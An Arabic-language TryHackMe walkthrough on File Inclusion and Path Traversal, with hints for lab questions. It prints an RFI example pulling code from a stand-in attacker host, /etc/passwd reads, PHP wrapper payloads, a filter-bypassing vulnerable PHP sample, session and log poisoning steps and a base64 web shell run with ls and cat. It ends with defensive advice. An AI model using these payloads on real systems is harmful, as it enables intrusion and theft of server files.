## 🎯 نظرة عامة على الغرفة

الغرفة بتتكلم عن ثغرات **File Inclusion** (LFI/RFI) و **Path Traversal**، وهي ثغرات بتحصل لما التطبيق يسمح لمدخلات المستخدم تتحكم في المسار (path) اللي بيتقرأ أو يتنفذ منه ملف على السيرفر.

**هتتعلم فيها:**
- إيه هو File Inclusion و Path Traversal وتأثيرهم
- إزاي تكتشف الثغرة في تطبيقات الويب
- إزاي تستغلها وصولاً لتنفيذ أوامر على السيرفر (RCE)
- إزاي تمنعها كمطور

**المتطلبات الأساسية:**
- فهم بسيط لبنية تطبيقات الويب والـ Server-Side Scripting
- إلمام بلغة PHP
- معرفة أساسية باستخدام Burp Suite / OWASP ZAP
- فكرة عامة عن File Inclusion

## 📙 Task 3 – File Inclusion Types

### المفاهيم الأساسية:

- **Traversal String** (`../`): بترجعك درجة واحدة للخلف في شجرة المجلدات، وبتتكرر للوصول لمجلدات بعيدة.
- **Relative Pathing**: تحديد مكان الملف بناءً على **المجلد الحالي** (مثال: `./folder/file.php`).
- **Absolute Pathing**: تحديد المسار **الكامل** بداية من الجذر (مثال: `/var/www/html/folder/file.php`).

### RFI vs LFI

| | RFI (Remote File Inclusion) | LFI (Local File Inclusion) |
|---|---|---|
| **الفكرة** | تضمين وتنفيذ ملف **خارجي** (من سيرفر المهاجم) | الوصول/تنفيذ ملفات **موجودة محلياً** على نفس السيرفر |
| **مثال** | `include.php?page=http://attacker.com/exploit.php` | `include.php?page=../../../../etc/passwd` |
| **أقصى خطر** | تنفيذ كود المهاجم مباشرة | ممكن تتصاعد لـ RCE عبر تقنيات زي Log Poisoning |

### 🧭 منهجية حل أسئلة Task 3
- السؤالين عن "نوع الـ pathing" إجابتهم موجودة **حرفياً** في أول سطرين من شرح "Basics of File Inclusion" — ركّز على التعريف اللي فيه كلمة "current directory" وده للنوع الأول، والتعريف اللي فيه "root directory" للنوع التاني.

## 📕 Task 4 – PHP Wrappers

### الفكرة الأساسية
**PHP Wrappers** هي جزء من وظائف PHP اللي بتسمح بالوصول لأنواع مختلفة من الـ Data Streams، وممكن كمان تُستخدم لتنفيذ كود.

### أهم الـ Wrappers:

- **`php://filter`**: بيسمح بعمل تحويلات (filters) على البيانات قبل قراءتها.
  - مثال: `php://filter/convert.base64-encode/resource=/etc/passwd` → بيرجع محتوى الملف مشفّر base64 (المهاجم بعدين يفك التشفير).

### أنواع الفلاتر:
| الفئة | أمثلة |
|---|---|
| String Filters | `string.rot13`, `string.toupper`, `string.tolower`, `string.strip_tags` |
| Conversion Filters | `convert.base64-encode`, `convert.base64-decode`, `convert.quoted-printable-encode/decode` |
| Compression Filters | `zlib.deflate`, `zlib.inflate` |
| Encryption Filters | `mcrypt`, `mdecrypt` (قديمة/متوقفة) |

- **`data://` Wrapper**: بيسمح بتضمين بيانات (زي كود PHP) مباشرة جوه الـ URL.
  - مثال: `data:text/plain,<?php phpinfo(); ?>` → ممكن يؤدي لتنفيذ كود لو التطبيق عرضة لذلك.

### 🧭 منهجية حل أسئلة Task 4
- السؤال بيطلب "اسم الخاصية اللي بتسمح بالوصول للـ Data Streams وتنفيذ الكود" → الإجابة هي نفس العنوان المكرر في كل عناوين الفقرات في الـ Task (مذكور حرفياً في أول جملة).

## 📓 Task 5 – Base Directory Breakouts

### الفكرة
بعض التطبيقات بتحاول تمنع الـ Path Traversal عن طريق:
1. إجبار المسار إنه يبدأ بمجلد أساسي معيّن (base directory).
2. فلترة سلاسل الهروب المعروفة زي `../..`.

### لكن الحماية دي ممكن تُلتف حولها!

**مثال الكود الضعيف:**
```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}
if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    } else {
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

**نقطة الضعف:** الفلتر بيدوّر بالظبط على `../..`، لكن `..//..//`  (بزيادة سلاش) بتأدي نفس الوظيفة فعلياً (نظام الملفات بيتعامل مع السلاشات المكررة كأنها سلاش واحد) **من غير** ما تطابق النمط المحظور حرفياً.

### تقنيات الـ Obfuscation (التمويه):

| التقنية | مثال |
|---|---|
| **URL Encoding** | `../` → `%2e%2e%2f` |
| **Double Encoding** | `../` → `%252e%252e%252f` (مفيدة لو التطبيق بيفك التشفير مرتين) |
| **Nested Obfuscation** | `....//` → بعد حذف `../` مرة واحدة بتترجع `../` تاني |

### 🧭 منهجية
الدرس الأساسي: **أي فلتر بيعتمد على Blacklist (حظر نمط معيّن) قابل للالتفاف حوله** — لازم تفكر دايماً: "إزاي أكتب نفس المعنى بشكل مختلف يتجنب الفلتر؟"

## 📔 Task 6 – LFI2RCE: Session Files (تسميم ملفات الجلسة)

### الفكرة
PHP بتخزن بيانات الجلسة (Session) في ملفات على السيرفر. لو قدرت تحقن كود PHP جوه قيمة متغير بتتخزن في الـ Session، وبعدين استخدمت ثغرة LFI عشان "تضم" ملف الجلسة ده، السيرفر هينفذ الكود.

### خطوات الاستغلال (نظرياً):
1. ابعت كود PHP (زي `<?php echo phpinfo(); ?>`) كقيمة للـ parameter الضعيف، عشان يتخزن في `$_SESSION`.
2. دوّر على قيمة كوكي `PHPSESSID` بتاعتك من إعدادات المتصفح (Session IDs بتكون مشفرة hash).
3. استخدم ثغرة الـ LFI عشان "تضم" ملف الجلسة المناظر، واللي بيكون في مسار شبه:
   `/var/lib/php/sessions/sess_[sessionID]`
4. الكود المحقون جوه ملف الجلسة هيتنفذ.

### 🧭 منهجية
ده أسلوب اسمه **PHP Session Poisoning**. الفكرة العامة اللي لازم تفهمها: **أي مكان تقدر تحقن فيه كود PHP وبعدين تضمّه عبر LFI = مرشح لـ RCE** (ده هيتكرر في الـ Tasks الجاية بطرق مختلفة).

## 📒 Task 7 – LFI2RCE: Log Poisoning

### الفكرة
**Log Poisoning** = حقن كود قابل للتنفيذ جوه ملف لوج (Log File) خاص بالسيرفر، وبعدين استخدام ثغرة LFI لتضمين وتنفيذ ملف اللوج ده.

### ليه الأسلوب ده "خفي"؟
لأن ملفات اللوج بتُعتبر جزء طبيعي وغير ضار من عمل السيرفر، فمش دايماً بتتراقب بنفس حرص الملفات التانية.

### خطوات الاستغلال (نظرياً):
1. ابعت طلب للسيرفر (مثلاً عبر `nc` أو عن طريق تعديل الـ User-Agent / Referer Header) يحتوي كود PHP زي:
   ```
   <?php echo phpinfo(); ?>
   ```
2. الطلب (حتى لو رجع Error) بيتسجل في ملف اللوج، مثلاً `/var/log/apache2/access.log`.
3. استخدم LFI عشان تضم ملف اللوج ده: `?page=/var/log/apache2/access.log`.
4. الكود اللي كان مسجل في اللوج هيتنفذ.

### 🧭 منهجية حل سؤال Task 7
السؤال بيطلب **اسم التقنية** نفسها، وهي مذكورة حرفياً كعنوان للـ Task وفي أول جملة من الشرح.

## 📕 Task 8 – LFI2RCE: Wrappers

### الفكرة
بدل ما تعتمد على اللوج أو السيشن، ممكن تستخدم `php://filter` مع فلتر **فك تشفير base64** (`convert.base64-decode`) مع wrapper الـ `data://` عشان تُنفّذ كود PHP مباشرة من غير الحاجة لحقن ملف على السيرفر الأساس.

### مكوّنات الـ Payload:

| الجزء | القيمة |
|---|---|
| Protocol Wrapper | `php://filter` |
| Filter | `convert.base64-decode` |
| Resource Type | `resource=` |
| Data Type | `data://plain/text,` |
| Encoded Payload | كود PHP (زي `<?php system($_GET['cmd']); ?>`) بعد تحويله لـ base64 |

### ⚠️ ملحوظة مهمة
لو هتبعت أمر عبر `&cmd=` في الفورم، احذر من الـ **Double URL Encoding** اللي ممكن يكسر الـ base64 payload — الأفضل تحطه مباشرة في شريط عنوان المتصفح (Address Bar).

### 🧭 منهجية حل سؤال Task 8 (محتوى الملف المخفي)
السؤال ده **عملي بالكامل** ولازم تنفذه بنفسك في الـ Lab، خطوات التفكير:
1. افتح `playground.php` وجهّز نفس بنية الـ payload (Protocol + Filter + Resource Type + Data Type + Encoded Payload).
2. شفّر كود `system($_GET['cmd'])` بصيغة base64 بنفسك (أو استخدم نفس الكود الموجود في الشرح لو تطابق السيناريو).
3. ابعت الـ payload مع إضافة `&cmd=ls` (أو أمر مشابه) في شريط العنوان مباشرة لعرض محتوى أي مجلد زي `flags/`.
4. بعد ما تعرف اسم الملف، استخدم `&cmd=cat flags/اسم_الملف.txt` لقراءة محتواه.
5. الناتج هيكون بصيغة `THM{...}` — ده شكل الـ Flag القياسي في TryHackMe.

> ⚠️ الـ Flag بيختلف حسب كل مكنة/نسخة، فلازم تنفذ الخطوات بنفسك في بيئتك للحصول على القيمة الصحيحة.

## 📔 Task 9 – Conclusion

### الخلاصة:
- **File Inclusion** (LFI/RFI): استغلال طريقة تعامل التطبيق مع الملفات.
- **Path Traversal**: التنقل في هيكل المجلدات للوصول لملفات خارج النطاق المسموح.
- الاتنين ممكن يؤديان لكشف بيانات حساسة أو اختراق كامل للنظام.

### أهم استراتيجيات الحماية:
1. **التحقق من صحة المدخلات (Validation & Sanitization)** لكل input بيتحكم في مسار ملف.
2. **استخدام Allowlisting**: حدد بوضوح الملفات المسموح تضمينها، وارفض أي شيء غير ذلك (أفضل بكثير من الاعتماد على Blacklist).
3. **ضبط إعدادات السيرفر**: عطّل `allow_url_fopen` و `allow_url_include` في PHP لو مش محتاجهم.
4. **مراجعات كود دورية وفحوصات أمنية** بأدوات آلية + مراجعة يدوية.
5. **تدريب فريق التطوير** على الممارسات الآمنة بشكل مستمر.
